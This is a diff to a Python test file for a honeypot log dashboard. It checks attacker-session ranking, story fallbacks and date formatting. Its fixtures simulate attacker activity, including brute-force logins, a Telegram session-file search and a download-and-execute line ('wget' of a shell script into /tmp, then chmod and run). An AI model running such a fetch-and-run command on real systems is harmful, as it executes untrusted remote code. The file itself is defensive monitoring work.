@@ -131,7 +131,7 @@ class TestLLMPasses:
         cache = {}
         hits = generate.generate_greatest_hits(data, desc_cache=cache)
         assert hits and hits[0]["story"]
-        assert not [k for k in cache if k.startswith("gh_")]
+        assert not [k for k in cache if k.startswith("gh2_")]
 
     def test_cached_fallback_replaced_once_llm_is_up(self, tmp_path, mocker):
         good = "Logged in, ran uname to fingerprint the box, then left \u2014 window-shopping."
@@ -140,7 +140,7 @@ class TestLLMPasses:
         data = _data(tmp_path, LINES)
         cache = {}
         generate.generate_greatest_hits(data, desc_cache=cache)
-        (k,) = [k for k in cache if k.startswith("gh_")]
+        (k,) = [k for k in cache if k.startswith("gh2_")]
         cache[k] = {"text": "Gained access and ran uname -a — hands-on-keyboard operator."}
         hits = generate.generate_greatest_hits(data, desc_cache=cache)
         assert hits[0]["story"] == good
@@ -189,3 +189,55 @@ class TestTerminalCaps:
         html, _ = generate.render_dashboard(_data(tmp_path, lines))
         assert html.count('<span class="cmd-prompt">$</span>') == 5
         assert "+8 more distinct commands" in html
+
+
+class TestGreatestHitsSelection:
+    def _lines(self):
+        out = []
+        def sess(ip, sid, cmds, attempts=1):
+            for k in range(attempts):
+                out.append(_make_log_line("cowrie.login.failed", src_ip=ip, session=sid + f"f{k}",
+                                          username="root", password=f"p{k}"))
+            out.append(_make_log_line("cowrie.login.success", src_ip=ip, session=sid, username="root", password="x"))
+            out.extend(_make_log_line("cowrie.command.input", src_ip=ip, session=sid, input=c) for c in cmds)
+        sess("9.9.9.9", "big", [], attempts=500)                                  # pure volume
+        for i in range(8):                                                        # 8 identical uname bots
+            sess(f"8.8.8.{i}", f"u{i}", ["uname -a"], attempts=100)
+        sess("7.7.7.7", "tg", ["locate D877F783D5D3EF8Cs"])                       # rare + interesting
+        sess("6.6.6.6", "dl", ["cd /tmp; wget http://1.2.3.4/x.sh; chmod +x x.sh; ./x.sh"])
+        return out
+
+    def test_interesting_and_distinct_attackers_win(self, tmp_path, mocker):
+        mocker.patch('generate.llm_generate', return_value="")
+        p = tmp_path / "c.json"; p.write_text("\n".join(self._lines()))
+        data = generate.analyze_events(generate.parse_log(str(p)), {})
+        ips = [a["ip"] for a in generate.pick_greatest_hits(data)]
+        assert ips[:2] == ["6.6.6.6", "7.7.7.7"] or set(ips[:2]) == {"6.6.6.6", "7.7.7.7"}
+        assert "9.9.9.9" in ips                                  # biggest brute-forcer keeps a slot
+        # every distinct behaviour gets a slot before any clone does
+        assert sum(ip.startswith("8.8.8.") for ip in ips[:4]) == 1
+        assert len(ips) == 6   # topped up only once distinct ones run out
+
+    def test_fallback_story_is_the_verified_summary(self, tmp_path, mocker):
+        mocker.patch('generate.llm_generate', return_value="")
+        p = tmp_path / "c.json"; p.write_text("\n".join(self._lines()))
+        data = generate.analyze_events(generate.parse_log(str(p)), {})
+        hits = {h["ip"]: h for h in generate.generate_greatest_hits(data, desc_cache={})}
+        assert hits["7.7.7.7"]["story"] == "Telegram session stealer: hunts for Telegram session files."
+        assert hits["7.7.7.7"]["cmds"] == 1
+
+
+class TestFriendlyDates:
+    def test_formats(self):
+        from datetime import datetime
+        tz = generate.LOCAL_TZ
+        t = lambda *a: datetime(*a, tzinfo=tz)
+        today = "2026-11-08"
+        assert generate.friendly_time(t(2026, 11, 8, 23, 32), today) == "23:32"
+        assert generate.friendly_time(t(2026, 11, 7, 9, 5), today) == "Nov 7, 09:05"
+        assert generate.friendly_time(t(2025, 12, 30, 9, 5), today) == "Dec 30, 2025, 09:05"
+        assert generate.friendly_range(t(2026, 11, 8, 23, 10), t(2026, 11, 8, 23, 32), today) == "23:10–23:32"
+        assert generate.friendly_range(t(2026, 11, 7, 1, 0), t(2026, 11, 7, 3, 12), today) == "Nov 7, 01:00–03:12"
+        assert generate.friendly_range(t(2026, 9, 27, 1, 0), t(2026, 11, 8, 3, 0), today) == "Sep 27 – today"
+        assert generate.friendly_day("2026-11-08", today) == "Today"
+        assert generate.friendly_day("2026-11-07", today) == "Sat, Nov 7"
